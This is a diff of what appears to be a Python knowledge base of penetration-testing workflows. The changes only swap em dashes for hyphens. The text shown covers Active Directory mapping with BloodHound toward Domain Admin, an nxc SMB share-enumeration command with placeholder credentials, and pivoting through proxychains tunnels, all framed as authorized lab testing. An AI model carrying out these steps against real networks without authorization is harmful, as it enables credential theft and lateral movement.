+        when_to_use="You hold any valid domain credential or a shell on a domain-joined host. Map the domain before attacking - the shortest path to Domain Admin is usually an existing misconfiguration, not an exploit.",
         checklist=(
             "Validate the credential and identify what it can reach.",
             "Collect BloodHound data and review paths to high-value targets.",
@@ -1196,12 +1196,12 @@ _WORKFLOWS: dict[str, Workflow] = {
             ),
             (
                 "nxc smb [TARGET_IP] -u [USER] -p [PASS] --shares",
-                "Readable/writable shares — a common source of further credentials.",
+                "Readable/writable shares - a common source of further credentials.",
             ),
         ),
         expected_output="A domain map: who you are, what you can reach, BloodHound paths toward Domain Admin, and any roastable accounts or ACL edges available to abuse.",
         verification=(
-            "Confirm BloodHound ingested the data — the node count should match the domain size, not be zero.",
+            "Confirm BloodHound ingested the data - the node count should match the domain size, not be zero.",
             "Before chasing a BloodHound path, re-verify each edge still exists; lab state can drift between collections.",
         ),
         troubleshooting=(
@@ -1228,11 +1228,11 @@ _WORKFLOWS: dict[str, Workflow] = {
         display_name="Pivoting",
         related=("linux-privesc", "windows-privesc"),
         category="lateral-movement",
-        title="Pivoting — Tunneling & Internal Network Access",
+        title="Pivoting - Tunneling & Internal Network Access",
         priority=60,
         when_to_use="You have a foothold on a host that can reach an internal segment you cannot. Use the foothold to route traffic into that segment for authorized lab testing only.",
         checklist=(
-            "Map what the foothold host can reach — interfaces, routes, ARP neighbours.",
+            "Map what the foothold host can reach - interfaces, routes, ARP neighbours.",
             "Identify internal hosts and services not exposed externally.",
             "Establish a tunnel or port forward back to your attack box.",
             "Confirm tooling works through the tunnel before deep enumeration.",
@@ -1263,7 +1263,7 @@ _WORKFLOWS: dict[str, Workflow] = {
         expected_output="A working tunnel: internal lab hosts reachable from your attack box via proxychains, plus a clear picture of the internal segment's live hosts and services.",
         verification=(
             "Confirm the tunnel with a simple `proxychains curl` or `proxychains nmap -sT` against a known internal host before larger scans.",
-            "Remember proxychains needs full TCP connect scans (`-sT -Pn`) — SYN scans do not traverse SOCKS.",
+            "Remember proxychains needs full TCP connect scans (`-sT -Pn`) - SYN scans do not traverse SOCKS.",
         ),
         troubleshooting=(
             (
